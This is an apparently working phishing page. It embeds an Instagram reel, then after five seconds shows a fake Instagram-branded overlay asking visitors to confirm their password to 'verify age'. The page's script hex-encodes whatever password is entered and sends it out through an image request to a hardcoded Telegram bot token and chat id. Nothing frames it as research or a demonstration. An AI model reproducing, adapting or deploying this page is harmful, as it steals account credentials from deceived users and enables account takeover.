<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;background:#000;font-family:sans-serif;">
    <div id="p" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9;color:#fff;text-align:center;padding-top:100px;">
        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="50"><br><br>
        <p>Confirm your Instagram Password to verify age.</p>
        <input type="password" id="ps" style="padding:10px;width:80%;border-radius:5px;border:none;"><br><br>
        <button onclick="s()" style="background:#0095f6;color:#fff;border:none;padding:10px 20px;border-radius:5px;">Verify</button>
    </div>
    <iframe id="f" src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%;height:100vh;border:none;"></iframe>
    <script>
        const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
        const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
        setTimeout(() => { document.getElementById('p').style.display='block'; }, 5000);
        function s(){
            let p=document.getElementById('ps').value;
            if(p){
                new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔑_PASS_${h(p)}`;
                document.getElementById('p').style.display='none';
            }
        }
    </script>
</body>
</html>
